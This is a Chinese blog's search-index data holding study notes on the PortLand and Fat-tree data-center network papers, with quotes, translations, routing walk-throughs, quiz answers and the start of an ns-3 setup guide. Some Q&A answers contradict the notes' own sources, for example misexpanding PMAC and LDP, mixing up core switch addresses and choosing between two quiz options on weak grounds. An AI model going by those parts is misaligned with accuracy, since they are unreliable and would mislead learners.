IP 到 MAC 地址映射的 ARP 请求，并在步骤 2 中将请求转发给结构管理器。Fabric 管理器会查询其 PMAC 表，查看是否有目标 IP 地址的条目。如果有，它会在步骤 3 中将 PMAC 返回给边缘交换机。边缘交换机在步骤 4 中创建 ARP 回复，并将其返回给原始主机。🔤\n步骤1-2：边缘交换机拦截针对IP到MAC地址映射的ARP请求，并将请求转发给布线管理器。ARP请求不被广播。\n步骤3：布线管理器查询其PMAC表，查看目标IP地址是否有条目可用。如果有，则返回PMAC给边缘交换机。\n步骤4：边缘交换机创建ARP响应，并将其返回给原始主机。\n“Note that end hosts receive PMACs in response to an ARP request and that all packet forwarding proceeds based on the hierarchical PMAC. The egress switch performs PMAC to AMAC rewriting only on the last hop to the destination host.” (Niranjan Mysore 等, 2009, p. 43)\nPMAC是针对ARP请求的应答而接收到的，所有数据包转发都是根据层次式PMAC进行的。出口交换机只在最后一跳到达目标主机时才执行PMAC到AMAC的重写。\nDistributed Location Discovery LDP\n“we also present a location discovery protocol (LDP) that requires no administrator configuration. PortLand switches do not begin packet forwarding until their location is established.” (Niranjan Mysore 等, 2009, p. 44) 🔤我们还介绍了一种无需管理员配置的位置发现协议（LDP）。在确定位置之前，PortLand 交换机不会开始转发数据包。🔤\nLDM\n“PortLand switches periodically send a Location Discovery Message (LDM) out all of their ports both, to set their positions and to monitor liveness in steady state. LDMs contain the following information:” (Niranjan Mysore 等, 2009, p. 44) 🔤PortLand 交换机会定期向其所有端口发送位置发现信息（LDM），以设置其位置并监控稳定状态下的有效性。LDM 包含以下信息：🔤\n交换机标识符（switch id）：每个交换机的全局唯一标识符，如所有本地端口的最低 MAC 地址。 pod 号码（pod）：同一 pod 中所有交换机共享的号码（见图 1）。不同 pod 中的交换机将有不同的 pod 编号。核心交换机从不设置此值。 位置 (pos)：分配给每个边缘交换机的编号，在每个 pod 中都是唯一的。 树级别（level）：0、1 或 2，取决于交换机是边缘交换机、汇聚交换机还是核心交换机。我们的方法适用于更深的层次结构。 向上/向下（dir）：Up/down（向上/向下）是一个位，表示交换机端口在多根树中的朝向是向下还是向上。 行7:如果一个交换机在足够长的时间内没有连接到超过 k/2 个邻居交换机，则它是边缘交换机。行8:incoming_port up 在接收到任何后续的LDM时，边缘交换机推断相应的入站端口是一个朝上的端口。\n行10、11:交换机在上行端口上接收到来自边缘交换机的 LDM 时，会断定自己一定是聚合交换机，而且相应的传入端口是下行端口。\n行12-13:\u0026ldquo;第12-13行处理核心/聚合交换机向尚未设置部分端口方向的聚合/边缘交换机传输LDMS的情况。\u0026ldquo;行14:核心交换机的验证首先要验证其所有活动端口都已连接到其他 PortLand 交换机\n行15-18:然后在第 15-18 行中验证所有邻居都是尚未设置链接方向的汇聚交换机（连接到边缘交换机的汇聚交换机端口已被确定为朝下）。\n行20:如果这些条件成立，交换机就可以断定自己是核心交换机，并将其所有端口设置为向下。\n如算法 1 第 2-4 行和第 29 行所示，在多个位置号码同时被提议的情况下，聚合交换机会将提议的位置号码保留一段时间，然后再计时。\n起初，除了交换机标识符和端口号外，其他所有值都是未知的。\n我们假设所有交换机端口都处于三种状态之一：断开、连接到终端主机或连接到另一台交换机。\n“Edge switches learn their level by determining that some fraction of their ports are host connected.” 🔤边缘交换机通过确定其部分端口已连接主机来了解其等级。🔤\n“Level assignment then flows up the tree. Aggregations switches set their level once they learn that some of their ports are connected to edge switches.” 🔤然后，级别分配会沿着树向上流动。汇聚交换机在得知其部分端口连接到边缘交换机后，就会设置自己的级别。🔤\n“Finally, core switches learn their levels once they confirm that all ports are connected to aggregation switches.” 🔤最后，核心交换机在确认所有端口都连接到汇聚交换机后，就会学习其级别。🔤\nProvably Loop Free Forwarding 交换机使用 LDP 建立本地位置后，就会利用来自邻居的更新来填充转发表。\n核心交换机会了解直接连接的汇聚交换机的 pod 编号。转发数据包时，核心交换机只需检查 PMAC 目标地址中与 pod 编号相对应的位，即可确定适当的输出端口。\n汇聚交换机也会了解所有直接连接的边缘交换机的位置编号。汇聚交换机必须通过检查 PMAC 来确定数据包的目的地是同一 pod 中的主机还是不同 pod 中的主机。如果在同一 pod 中，则必须将数据包转发到与 PMAC 中位置条目相对应的输出端口。\n如果在不同的 pod 中，在无故障的情况下，数据包可以沿着汇聚交换机的任何链路转发到核心层。为实现负载平衡，交换机可采用多种技术选择合适的输出端口。Fabric 管理器将采用额外的流量表项来覆盖单个流量的默认转发行为。不过，这一决定与本工作无关，因此我们假定采用标准技术，如 ECMP 中的流量散列技术[16]。\n我们的转发协议通过观察上行-下行语义[26]可证明是无环的，数据包将总是被转发至聚合交换机或核心交换机，然后向其最终目的地下行传输。我们通过确保一旦数据包开始向下传输，便不可能向拓扑结构的上行传输，以防止瞬时环路和广播风暴。\n“Fault Tolerant Routing” 步骤1：如果在一段可配置的时间内没有接收到LDM(在此上下文中也称为keepalive)，交换机将在步骤1中假定链路发生故障。\n步骤2:检测交换机将故障通知fabric管理器。\n步骤3:fabric管理器维护一个包含整个拓扑的每链路连接信息的逻辑故障矩阵，并用新信息更新它。\n步骤4:最后，在步骤4中，fabric管理器将故障通知所有受影响的交换机，然后这些交换机根据新版本的拓扑分别重新计算它们的转发表。\n“Required state for network connectivity is modest, growing with k3/2 for a fully-configured fat tree built from k-port switches.” (Niranjan Mysore 等, 2009, p. 45) 网络连接所需的状态是适度的，对于由k端口交换机构建的完全配置的胖树来说，它随着k3/2的增长而增长。\nFault Tolerant Routing for Multicast 现在我们考虑组播和广播情况下的容错。相对于现有的协议，我们考虑的故障场景是，没有一个单一的生成树植根于一个核心交换机，能够覆盖一个多播组或广播会话的所有接收器。考虑图5中的示例。\n在这里，我们有一个多播组映射到最左边的核心交换机。有三个接收器，分布在0号pod和1号pod（图中三个R）。发送端将数据包转发到指定的核心交换机，核心交换机再将数据包分发给接收端。\n步骤1：在步骤1中，pod 0中两个突出显示的链接同时失败。\n步骤2:两个汇聚交换机检测到故障并通知fabric管理器\n步骤3:fabric管理器更新其故障矩阵。\n步骤4:fabric管理器计算所有受影响的多播组的转发表项。\n步骤5:我们通过计算与每个多播组相关联的接收器集的贪婪集覆盖来处理这种情况。这可能导致多个指定的核心交换机与多播或广播组相关联。fabric管理器在图5的步骤5中将所需的转发状态插入到适当的表中。\n从故障中恢复需要通过pod 0中的两个单独的聚合交换机进行转发。但是，不存在同时连接两个汇聚交换机的单核交换机。\n🚩 研究结论 📌 感想 \u0026amp; 疑问 Why existing L2 and L3 techniques can not satisfy R1-5 for the cloud datacenter? 单一网络结构（R1和R2）： 云数据中心要求整个数据中心使用一个相同的网络结构，但L3技术需要为每个交换机配置子网信息，而L2技术由于需要支持广播而面临效率和可扩展性的挑战。 透明虚拟机迁移（R3）： 在L3中，虚拟机迁移到不同子网的主机时需要切换IP地址，这导致透明的迁移变得不可能。而L2的MAC表也面临着在硬件上不切实际的问题。 转发环路问题（R4）： 无论是L2还是L3，在路由收敛期间都可能发生转发环路问题，这在设计上很困难。 高效路由协议（R5）： 要求一种能够快速传播拓扑变化的高效路由协议，但现有的L2和L3协议都是基于广播的，效率不高。 What is PMAC address?、 PMAC（Pseudo MAC）地址是PortLand网络设计中使用的一种地址。每个终端主机在PortLand中被分配了一个唯一的PMAC地址，用于编码该主机在网络拓扑中的位置。PMAC地址使得路由转发和虚拟机迁移变得高效。终端主机保持其实际的MAC（AMAC）地址不变，不知道自己被分配了一个PMAC地址。在进行ARP请求时，源主机会收到目标主机的PMAC地址。所有的数据包转发都基于PMAC地址进行，这样可以实现非常小的转发表。出口交换机会对PMAC地址进行转换，以保持目标主机的MAC地址不变。\nLocation discovery. 位置发现是指在网络中确定设备的位置的过程。根据提供的上下文信息[2]，PortLand使用一种轻量级协议来帮助交换机发现其在拓扑中的位置。交换机通过接收LDM（Link Detection Message）来了解其邻居交换机的信息，通过判断与多少个邻居交换机相连来确定是否为边缘交换机。边缘交换机通常有一半以上的端口连接到终端设备。在确认自己是边缘交换机后，交换机可以通过在所有端口上进行PING操作来进一步确认其位置。终端设备将回复PING请求，而不会发送LDM。\nHow PortLand satisfies R1 – R5? R1: VM can migrate, introduce PMAC R2: no configuration, LDP protocol R3: use all equal cost paths, ECMP R4: no loop R5: failure-tolerant, fabric manager PortLand满足R1-R5的方式如下：\nR1: 虚拟机迁移和引入PMAC： PortLand允许虚拟机迁移，并引入了PMAC（Persistent MAC）来保持虚拟机在不同子网上的IP地址不变，实现了透明的虚拟机迁移。 R2: 无需配置和LDP协议： PortLand不需要在每个交换机上进行繁琐的配置，而是使用了LDP（Label Distribution Protocol）协议，简化了网络管理的复杂性。 R3: 使用所有等价路径和ECMP： 为了实现更好的负载均衡和性能，PortLand利用ECMP（Equal Cost Multipath）使用所有等价路径，确保数据流可以通过多条路径传输，提高网络利用率。 R4: 无环路： PortLand设计中考虑了防止转发环路的问题，确保在网络路由收敛时不会出现不必要的循环。 R5: 容错性强，有Fabric Manager： PortLand具备故障容忍性，通过Fabric Manager进行管理，确保在网络中出现故障时可以及时调整和修复，提高了网络的可靠性和稳定性。 是的，这篇文章使用了伪MAC地址（PMAC）技术。\n🔬 理论推导 ","date":"2023-12-20T22:51:25+08:00","permalink":"https://anonymity-0.github.io/posts/portland/","title":"Portland"},{"content":"A scalable, commodity data center network architecture\n💡 Meta Data Title\nA scalable, commodity data center network architecture\nJournal\nACM SIGCOMM Computer Communication Review\nAuthors\nMohammad Al-Fares; Alexander Loukissas; Amin Vahdat\nPub. date\n八月 17, 2008\n期刊标签\nDOI\n10.1145/1402946.1402967\n附件\nAl-Fares et al_2008_A scalable, commodity data center network architecture.pdf\n📜 研究背景 \u0026amp; 基础 \u0026amp; 目的 “Clusters consisting of tens of thousands of PCs are not unheard of in the largest “institutions and thousand-node clusters are increasingly common in universities, research labs, and companies.” (Al-Fares 等, 2008, p. 63) 大型机构中由数万台PC组成的集群并不少见，在大学，研究实验室和公司中，千节点集群越来越普遍。这些集群用于各种目的，包括科学计算，数据分析和机器学习。它们提供了大量的计算能力，可用于解决复杂问题。\nDC Communications M2M communications：M2M communications，即机器对机器通信，是指机器与机器之间进行的数据通信。M2M通信的目的通常是实现机器之间的自动化控制和数据交换。\n“Today, the principle bottleneck in large-scale clusters is often inter-node communication bandwidth.” (Al-Fares 等, 2008, p. 63) 如今，大规模集群的主要瓶颈往往是节点间的通信带宽。\n“For example, MapReduce [12] must perform significant data shuffling to transport the output of its map phase before proceeding with its reduce phase. Applications running on clusterbased file systems [18, 28, 13, 26] often require remote-node access before proceeding with their I/O operations.” (Al-Fares 等, 2008, p. 63) 例如，MapReduce必须先进行大量的数据重组，以传输其映射阶段的输出，然后再进入还原阶段。在基于集群的文件系统上运行的应用程序在进行 I/O 操作前，通常需要远程节点访问。\n“A query to a web search engine often requires parallel communication with every node in the cluster hosting the inverted index to return the most relevant results [7].” (Al-Fares 等, 2008, p. 63) 🔤对网络搜索引擎的查询往往需要与承载倒排索引的集群中的每个节点进行并行通信，以返回最相关的结果[7]。🔤\n“Internet services increasingly employ service oriented architectures [13], where the retrieval of a single web page can require coordination and communication with literally hundreds of individual sub-services running on remote nodes.” (Al-Fares 等, 2008, p. 63) 🔤互联网服务越来越多地采用面向服务的架构[13]，在这种架构下，检索一个网页可能需要与远程节点上运行的数百个单独的子服务进行协调和通信。🔤\nTwo approaches for DC network “There are two high-level choices for building the communication fabric for large-scale clusters.”\napproach1 “One option leverages specialized hardware and communication protocols, such as InfiniBand [2] or Myrinet [6].” (Al-Fares 等, 2008, p. 63) 🔤一种方法是利用专用硬件和通信协议，如 InfiniBand [2] 或 Myrinet [6]。🔤\n缺点：\n“they do not leverage commodity parts (and are hence more expensive)” (Al-Fares 等, 2008, p. 63)它们不使用通用零件（因此更昂贵）\n“not natively compatible with TCP/IP applications.” (Al-Fares 等, 2008, p. 63) 🔤与 TCP/IP 应用程序不兼容。🔤\napproach2 “The second choice leverages commodity Ethernet switches and routers to interconnect cluster machines.” (Al-Fares 等, 2008, p. 63) 🔤第二种选择是利用商品以太网交换机和路由器实现集群机器之间的互联。🔤\n优点：\n“This approach supports a familiar management infrastructure along with unmodified applications, operating systems, and hardware.” (Al-Fares 等, 2008, p. 63) 🔤这种方法支持熟悉的管理基础设施以及未经修改的应用程序、操作系统和硬件。🔤\nDesired Properties for a DC Network Architecture直流网络架构的理想特性 “Scalable interconnection bandwidth: it should be possible for an arbitrary host in the data center to communicate with any other host in the network at the full bandwidth of its local network interface.” (Al-Fares 等, 2008, p. 64) 🔤可扩展的互联带宽：数据中心的任意一台主机都应能以其本地网络接口的全部带宽与网络中的任何其他主机进行通信。🔤\nScalable interconnection bandwidth: an arbitrary host can communicate with any other host at the full bandwidth of its local network interface (non-blocking).数据中心网络应该能够支持任意两个主机之间的全带宽通信，并且不会发生通信阻塞。这句话是数据中心网络设计的一个重要目标。 “Economies of scale: just as commodity personal computers became the basis for large-scale computing environments, we hope to leverage the same economies of scale to make cheap off-the-shelf Ethernet switches the basis for largescale data center networks.” (Al-Fares 等, 2008, p. 64) 🔤规模经济：正如商品化个人电脑成为大规模计算环境的基础一样，我们希望利用同样的规模经济，使廉价的现成以太网交换机成为大规模数据中心网络的基础。🔤\nEconomies of scale: make cheap off-the-shelf Ethernet switches the basis for large scale data center networks\n规模经济使廉价的现成以太网交换机成为大型数据中心网络的基础\n这句话的意思是，由于规模经济效应，廉价的现成以太网交换机在大型数据中心网络中得到了广泛应用。\n规模经济效应是指企业随着生产规模的扩大，单位产品的成本会降低的现象。在数据中心网络中，由于大型数据中心需要大量的以太网交换机，因此规模经济效应可以显著降低以太网交换机的成本。\n“Backward compatibility: the entire system should be backward compatible with hosts running Ethernet and IP. That is, existing data centers, which almost universally leverage commodity Ethernet and run IP, should be able to take advantage of the new interconnect architecture with no modifications.” (Al-Fares 等, 2008, p. 64) 🔤向后兼容性：整个系统应向后兼容运行以太网和 IP 的主机。也就是说，几乎普遍利用商品以太网和运行 IP 的现有数据中心应能利用新的互连架构，而无需进行任何修改。🔤\nBackward compatibility: the entire system should be backward compatible with hosts running Ethernet and IP.\n向后兼容：整个系统应与运行以太网和 IP 的主机向后兼容\n这句话强调了系统需要与现有以太网和 IP 网络无缝集成的重要性。这确保了新主机和设备可以与遗留设备无缝通信，防止中断并确保平稳过渡到新系统。\nConventional Data Center Network Topologies 传统数据中心网络拓扑结构 (Al-Fares 等, 2008, p. 65)\n“Typical architectures today consist of either two- or three-level trees of switches or routers. A three-tiered design (see Figure 1) has a core tier in the root of the tree, an aggregation tier in the middle and an edge tier at the leaves of the tree.” (Al-Fares 等, 2008, p. 64) 🔤目前，典型的架构由两层或三层交换机或路由器树组成。三层设计（见图 1）的核心层位于树的根部，汇聚层位于树的中部，边缘层位于树的叶部。🔤\n核心层（Core Tier）: 核心层是网络的顶层，负责处理整个数据中心内的高级路由和转发。它通常拥有大量的高速连接，以支持大规模的数据传输。 聚合层（Aggregation Tier）: 聚合层位于核心层和边缘层之间，负责将来自边缘层的流量进行汇总和转发。这一层的存在有助于提高网络的可扩展性和性能。 边缘层（Edge Tier）: 边缘层是网络结构的底层，位于树的末端，通常与终端设备直接相连。它处理与数据中心内部设备的直接通信，如服务器、存储设备等。 “We assume the use of two types of switches, which represent the current high-end in both port density and bandwidth. The first, used at the edge of the tree, is a 48-port GigE switch, with four 10 GigE uplinks. For higher levels of a communication hierarchy, we consider 128-port 10 GigE switches. Both types of switches allow all directly connected hosts to communicate with one another at the full speed of their network interface.” (Al-Fares 等, 2008, p. 64) 🔤我们假设使用两种类型的交换机，它们在端口密度和带宽方面都代表了当前的高端水平。第一种是用于树边缘的 48 端口千兆以太网交换机，带有四个万兆以太网上行链路。对于通信层次结构的较高层次，我们考虑使用 128 端口万兆以太网交换机。这两种类型的交换机都允许所有直接连接的主机以其网络接口的全速相互通信。🔤\nTwo types of switches:\n48-port GigE switch, with four 10 GigE uplinks, used at the edge of the tree\n这是一种用于数据中心网络结构边缘的交换机类型。 具有48个千兆以太网端口，这些端口用于连接直接的终端设备（主机）。 同时，它还有四个10千兆以太网的上行链路，连接到更高层次的网络结构，用于传输数据到聚合层。 128-port 10 GigE switch for higher levels of a communication hierarchy\n这是另一种用于通信层次的较高级别的交换机类型。 具有128个10千兆以太网端口，用于连接到。更多的底层交换机或直接连接到边缘层的终端设备 这种交换机具有更大的端口密度和更高的带宽，适用于需要处理更多数据流量的网络层次。 无论是48端口的千兆以太网交换机还是128端口的10千兆以太网交换机，它们都能够让直接连接的设备之间以最大速度进行通信。\n“Oversubscription” 过度订阅是一种设计数据中心网络的策略，目的是降低总体设计成本。\n“We define the term oversubscription to be the ratio of the worst-case achievable aggregate bandwidth among the end hosts to the total bisection bandwidth of a particular communication topology.” (Al-Fares 等, 2008, p. 64) 🔤我们将 \u0026ldquo;超量订购 \u0026ldquo;定义为终端主机之间最坏情况下可实现的总带宽与特定通信拓扑的总带宽之比。🔤\n文中定义过度订阅为终端主机之间最坏情况下可实现的总带宽与特定通信拓扑的总带宽之比\n“An oversubscription of 1:1 indicates that all hosts may potentially communicate with arbitrary other hosts at the full bandwidth of their network interface (e.g., 1 Gb/s for commodity Ethernet designs).” (Al-Fares 等, 2008, p. 64)\n1:1的过度订阅表示所有主机可以潜在地以它们网络接口的完整带宽进行通信，例如，对于通用以太网设计，即1 Gb/s。\n“An oversubscription value of 5:1 means that only 20% of available host bandwidth is available for some communication patterns. Typical designs are oversubscribed by a factor of 2.5:1 (400 Mbps) to 8:1 (125 Mbps) [1].” (Al-Fares 等, 2008, p. 64) 🔤5:1 的超额订购值意味着只有 20% 的可用主机带宽可用于某些通信模式。典型设计的超额订购系数为 2.5:1 （400 Mbps）至 8:1（125 Mbps）[1]。🔤\n虽然 1 Gb/s 以太网的数据中心可以实现 1:1 的超量订阅，但这种设计的成本通常过高。\nMulti-path Routing “Delivering full bandwidth between arbitrary hosts in larger clusters requires a “multi-rooted” tree with multiple core switches (see Figure 1).” (Al-Fares 等, 2008, p. 64) 🔤要在大型集群中的任意主机之间提供全带宽，就需要一个具有多个核心交换机的 \u0026ldquo;多根 \u0026ldquo;树（见图 1）。🔤\nMulti-Rooted Tree (多根树):\n这表示网络拓扑中存在多个核心交换机，这些交换机在树的根部，以支持更多的路径选择。\n“To take advantage of multiple paths, ECMP performs static load splitting among flows.” (Al-Fares 等, 2008, p. 64) 🔤为了利用多条路径，ECMP 在流量之间执行静态负载分流。🔤\nECMP (Equal-Cost Multi-Path):\nECMP 是一种多路径路由技术，旨在平均分担等代价路径上的流量。\n它允许在多个等代价路径上进行流量的分发，以提高网络的利用率。\nECMP 的实现对于路径的多样性有一定的限制，通常限制在 8-16 条路径之间。\n这可能不足以满足较大数据中心所需的高二分带宽，因为这限制了网络在不同路径上进行流量分发的灵活性。\n使用 ECMP 时，考虑的路径数量成倍增加，导致路由表的条目数量也成倍增加。\n这会增加系统的成本，并可能导致查找延迟的增加。\nCost (Al-Fares 等, 2008, p. 65)\n维持一个固定的oversubscription，cost会随规模急剧增加。\n(Al-Fares 等, 2008, p. 65)\n大型集群中实现高带宽水平的现有技术会产生显著的成本，而基于 fat-tree 架构的集群互连在适度的成本下具有显著的潜力。\n使用最大的10千兆以太网（10 GigE）和通用千兆以太网（GigE）交换机构建具有1:1过度订阅的数据中心，以及该集群最多可支持27,648个主机\n📊 研究内容 Fat tree based solution 有k个pod，每个pod包含两层k/2个交换机。这样的结构使得网络具有层次化的特点。\n在底层，每个k端口的交换机直接连接到k/2个主机。这确保了较低层次的直接主机连接。\n剩余的k/2个端口连接到层次结构中聚合层的k/2个端口。\n在fattree拓扑中，存在**(k/2)^2**个k端口的核心交换机。每个核心交换机有k个端口，其中每个端口连接到k个pod之一。\n考虑一个fattree拓扑，其中有k个pod，每个pod有k/2个交换机，每个交换机有k个端口。\n任意两个主机可能位于不同的pod，因此可以通过连接这两个pod的多条路径进行通信。对于每个pod，存在(k/2)个交换机，因此在每个pod内也有(k/2)条不同的路径。因此，总的最短路径数为(k/2)²。\n每个核心交换机的第i个端口与第i个pod连接。这样的连接模式确保了每个pod都与所有核心交换机直接相连。\n在每个pod的聚合层交换机上，与核心交换机的连接是以(k/2)的步幅进行的，即相邻的聚合层端口与核心交换机的连接是在(k/2)步幅上的。\n在这篇论文中，重点关注k值最多为48的设计。\n地址 “We allocate all the IP addresses in the network within the private 10.0.0.0/8 block. We follow the familiar quad-dotted form with the following conditions: The pod switches are given addresses of the form 10.pod.switch.1,wherepod denotes the pod number (in [0,k − 1]), and switch denotes the position of that switch in the pod (in [0,k−1], starting from left to right, bottom to top). We give core switches addresses of the form 10.k.j.i,wherej and i denote that switch’s coordinates in the (k/2)2 core switch grid (each in [1, (k/2)], starting from top-left). The address of a host follows from the pod switch it is connected to; hosts have addresses of the form: 10.pod.switch.ID,where ID is the host’s position in that subnet (in [2,k/2+1], starting from left to right). Therefore, each lower-level switch is responsible for a /24 subnet of k/2 hosts (for k\u0026lt;256). Figure 3 shows examples of this addressing scheme for a fat-tree corresponding to k =4.Even though this is relatively wasteful use of the available address space, it simplifies building the routing tables, as seen below. Nonetheless, this scheme scales up to 4.2M hosts.” (Al-Fares 等, 2008, p. 66)\n在网络中，我们将所有的IP地址分配在私有的10.0.0.0/8地址块中。我们按熟悉的四点形式进行分配，具体如下：pod交换机的地址形式为10.pod.switch.1，其中pod表示pod的编号（范围在[0, k-1]之间），switch表示该pod中交换机的位置（范围在[0, k-1]之间，从左到右，从下到上）。核心交换机的地址形式为10.k.j.i，其中j和i表示该交换机在(k/2) x (k/2)的核心交换机网格中的坐标（范围在[1, k/2]之间，从左上角开始）。主机的地址由其所连接的pod交换机产生；主机的地址形式为10.pod.switch.ID，其中ID是该子网中主机的位置（范围在[2, k/2+1]之间，从左到右）。\n交换机地址的分配 核心交换机的地址 主机的地址 算法 z 在[k/2,k-1]的原因：pod里面的上层交换机\n最里面的第一个循环的意思是：给pod里面的上层交换机按顺序添加前缀\n第二个addprefix的意思是增加一个0.0.0.0/0的默认前缀\n第二个循环的意思是给主机添加特定前缀\n“The reason for the modulo shift in the outgoing port is to avoid traffic from different lower-layer switches addressed to a host with the same host ID going to the same upper-layer switch.” (Al-Fares 等, 2008, p. 68) 🔤出站端口之所以要进行模数转换，是为了避免从不同下层交换机发送到具有相同主机 ID 的主机的流量进入同一上层交换机。🔤\n生产核心交换机路由 (Al-Fares 等, 2008, p. 68)\n就是为每个核心交换机按顺序分配一个10.x.0.0/16的路由\n例子 从10.0.1.2到10.2.0.3\n源主机（10.0.1.1）的网关交换机只会匹配带有 /0 一级前缀的数据包，因此会根据该前缀的二级表中的主机 ID 字节转发数据包。在该表中，数据包匹配 0.0.0.3/8 后缀，指向端口 2 和交换机 10.0.2.1（i=3，z=1）\n端口2:（3-2+1)mod(4/2+4/2)=2 为什么指向10.0.2.1？因为10.0.1.1到端口0和端口1指向向下的俩host，端口2指向10.0.2.1（从下到上，从左到右） “Switch 10.0.2.1 also follows the same steps and forwards on port 3, connected to core switch 10.4.1.1” (Al-Fares 等, 2008, p. 68) 🔤交换机 10.0.2.1 也遵循相同步骤，在连接到核心交换机 10.4.1.2 的端口 3 上进行转发🔤\ni=3，z=2，（3-2+2）mod（2+2）=3 因为目的地址在pod2，核心交换机10.4.1.2匹配10.2.0.0/16，端口2，指向10.2.2.1\n10.2.2.1匹配到10.2.0.0/24，指向10.2.0.1\n🚩 研究结论 📌 感想 \u0026amp; 疑问 What is the datacenter network? What is the desired property of the datacenter network? 根据提供的信息，对于数据中心网络，论文[1]提出了一种基于可扩展性和通用性的架构。数据中心网络旨在支持大规模集群之间的通信，并具有以下期望特性：\n1. 可扩展性：数据中心网络需要能够支持数以千计甚至数以百万计的节点，并提供良好的吞吐量和性能。这是因为数据中心通常由大量服务器和计算资源组成。\n2. 低延迟：数据中心网络需要具备低延迟的特性，以确保快速和高效的数据传输。这对于网络中的实时应用和大数据处理等任务至关重要。\n3. 高带宽：数据中心网络需要具有高带宽，以处理大量数据的传输需求。这是因为数据中心中经常需要在节点之间进行大规模的数据传输和通信。\nWhat is the traditional three-tier topology for the datacenter, its limitations? 传统的数据中心网络采用三层架构，包括核心层、聚合层和接入层。核心层处理数据中心内部的高级路由功能，聚合层用于连接核心层和接入层，并提供流量聚合和负载均衡。接入层则负责连接终端设备和聚合层。然而，传统的三层架构在规模扩大时会面临一些限制，如带宽瓶颈和复杂的缆线布局，导致整体性能和可扩展性受限。\nHow Fat-tree differs from the traditional design? In Topology\nFat-tree 是一种分层的树形结构，它通过增加接近根部的节点的带宽来解决网络瓶颈问题。在这种结构中，越靠近根部的节点（比如交换机）拥有更高的处理能力和更大的带宽。这种设计使得网络能够更好地扩展，并支持更多的终端节点。\nAddressing\nIP 地址范围：\n所有的 IP 地址都分配在私有的 10.0.0.0/8 地址块内。 Pod 交换机地址：\n每个 Pod 交换机的 IP 地址格式为 10.pod.switch.1。 其中 pod 是 Pod 编号，范围是 [0, k-1]。 switch 是该交换机在 Pod 内的位置，范围也是 [0, k-1]，按照从左到右、从下到上的顺序。 核心交换机地址：\n核心交换机的 IP 地址格式为 10.k.j.i。 j 和 i 是交换机在核心交换机网格中的坐标，范围是 [1, k/2]，从左上角开始。 主机地址：\n连接到 Pod 交换机的主机的 IP 地址格式为 10.pod.switch.ID。 ID 是主机在子网中的位置，范围是 [2, k/2+1]，按照从左到右的顺序。 子网管理：\n每个下级交换机管理一个包含 k/2 台主机的 /24 子网（当 k 小于 256 时）。 Routing algorithm 源 $ℎ1h1$ 到目的地 $ℎ2h2$ 的路由路径的例子。这个例子中，源地址是 10.0.1.2，目的地地址是 10.2.0.3。以下是每一跳的详细描述以及如何确定输出端口：\n第一跳 - 网关交换机:\n源主机的网关交换机（10.0.1.1）首先匹配到 /0 第一级前缀，然后根据该前缀的二级表中的主机 ID 字节来转发数据包。在这个表中，数据包匹配到 0.0.0.3/8 后缀，指向端口 2 和交换机 10.0.2.1 (页面 6)。 第二跳 - Pod 交换机:\n交换机 10.0.2.1 也执行相同的步骤，并通过连接到核心交换机 10.4.1.1 的端口 3 转发数据包。 第三跳 - 核心交换机:\n核心交换机匹配数据包到一个终止的 10.2.0.0/16 前缀，这个前缀指向目的地 Pod 2。 如果目的地地址变成 10.2.0.2，路由路径将会有所不同。以下是基于文档中的两级路由表和网络拓扑的详细解释：\n第一跳 - 网关交换机:\n源主机的网关交换机（假设为 10.0.1.1）首先匹配到 /0 第一级前缀。然后，它会根据该前缀的二级表中的主机 ID 字节来转发数据包。在这个表中，数据包匹配到的后缀将会是 0.0.0.2/8，这将决定数据包应该转发到的端口和下一个交换机。 第二跳 - Pod 交换机:\n第二个交换机（例如 10.0.2.1）也会执行类似的步骤，根据其路由表中的匹配项来决定将数据包转发到哪个端口，以及下一个目标核心交换机。 第三跳 - 核心交换机:\n到达核心交换机（例如 10.4.1.1）后，它会匹配数据包到一个终止的 10.2.0.0/16 前缀。这个前缀指向目的地 Pod 2。核心交换机将根据其路由表决定将数据包转发到哪个 Pod 交换机。 最后一跳 - 到达目的地:\n在 Pod 2 内，相应的交换机将根据其路由表来决定如何将数据包最终转发到目的地地址 10.2.0.2 的主机。 问题 假设 Fattree 用10.0.0.0/8的地址空间进行编址，且不考虑单个交换机大小的物理限制。\n1. 该地址空间所能支持的最大 Fattree 有多少个pod，即K=\n首先，10.0.0.0/8的地址空间有\n$$2^{24}$$\n个IP地址，其中一个地址用于网络标识，一个地址用于广播，剩下的地址用于主机。\n$$\\frac{k^3}{4} \\leq 2^{24}-2$$\nk=406\n2.以下哪个数字是一个完整的Fattree 可能支持的主机数（）\nA. 4194304\nB. 2097152\nC.3906250\nD. 2916000\n对于A选项（4194304），我们需要解方程 $\\frac{k^3}{4}=4194304$。 对于B选项（2097152），方程为 $\\frac{k^3}{4}=2097152$。 对于C选项（3906250），方程为 $\\frac{k^3}{4}=3906250$。 对于D选项（2916000），方程为 $\\frac{k^3}{4}=2916000$。 我们可以计算每个方程来找出正确的答案。\n根据计算结果：\n对于选项A（4194304），计算得到的k值约为256，是一个合理的偶数。 对于选项B（2097152），计算得到的k值约为203.19，不是偶数。 对于选项C（3906250），计算得到的k值约为250，是一个合理的偶数。 对于选项D（2916000），计算得到的k值约为226.79，不是偶数。 由于k必须是偶数，因此只有选项A和C的k值符合条件。但在Fat-tree拓扑中，k通常是2的幂次方，所以最符合条件的答案是选项A（4194304），其对应的k值为256。\n3. Fattree 用的是交换机连接，给每个交换机分配 IP地址的目的是\n“we introduce the concept of two-level route lookups to assist with multi-path routing across the fat-tree.” (Al-Fares 等, 2008, p. 66) 🔤我们引入了两级路由查找的概念，以帮助在胖树上进行多路径路由选择。🔤\n“Even though this is relatively wasteful use of the available address space, it simplifies building the routing tables, as seen below.” (Al-Fares 等, 2008, p. 66) 🔤尽管这相对浪费了可用地址空间，但却简化了路由表的构建，如下所示。🔤\nFattree使用交换机连接，并给每个交换机分配IP地址的目的是为了实现数据中心的通信和路由功能。通过给交换机分配IP地址，可以在网络中对不同的主机进行定位和识别，实现数据包的转发和数据中心网络的路由控制。这样可以保证在数据中心网络中的每个交换机都能够准确地识别和转发数据包。此外，通过对不同交换机分配不同的IP地址，还可以构建网络拓扑和路由表，实现数据中心网络的高效通信和负载均衡。\n🔬 理论推导 参考 https://blog.csdn.net/baidu_20163013/article/details/110004560\nhttps://blog.csdn.net/u012925450/article/details/108493968\nhttps://blog.csdn.net/weixin_44639164/article/details/126950178?\n","date":"2023-12-19T15:45:19+08:00","permalink":"https://anonymity-0.github.io/posts/fat-tree/","title":"Fat Tree"},{"content":"介绍 ns3是用来进行网络仿真的一个平台\n学习资源 略\n安装 源码安装 详情可参考ns-3 Installation Guide — Installation guide\n下载源码 [Releases | ns-3](https://www.nsnam.org/releases/ 进入网站选择版本下载 编译源码 